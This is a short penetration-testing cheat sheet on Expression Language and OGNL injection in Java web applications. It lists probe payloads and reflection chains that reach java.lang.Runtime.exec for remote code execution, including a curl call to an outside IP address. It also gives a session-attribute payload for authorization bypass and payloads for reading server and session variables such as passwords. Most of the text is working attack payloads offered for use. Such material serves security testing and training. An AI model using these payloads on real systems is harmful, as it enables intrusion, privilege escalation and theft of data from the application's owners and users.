# OGN/Expression Language Injection
## Check if it is Java application
 Java applications are easily recognizable as they tend to:
- Use common extensions like .jsp or .jsf
- Throw stack traces on errors
- Use known terms in headers like "Servlet”

## Test Payloads
```Java
{5*5}
${5*5}
#{5*5}
%{5*5}
%25{5*5}
```

## Exploitation
In order to make use of different java classes other than string, we will use Reflection. Reflection is java’s mechanism that allows us to invoke methods without initially knowing their names.

```java
// Get Class Name aka string
{"x".getClass()} 

// Subvert Object type
{"".getClass().forName("java.util.Date")}

// Enumerate Object Methods
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}

// Check Runtime method exists
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}

// Invoke Runtime method to get RCE
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl 10.10.10.14:808")}

// Enumerate server variables such as
${application}
${sessionScope.toString()}
${request}


// Sample authorization bypass
${pageContext.request.getSession().setAttribute("admin",true)}

// Use intruder to look for common variables such as
${user}
${password}
${password}

```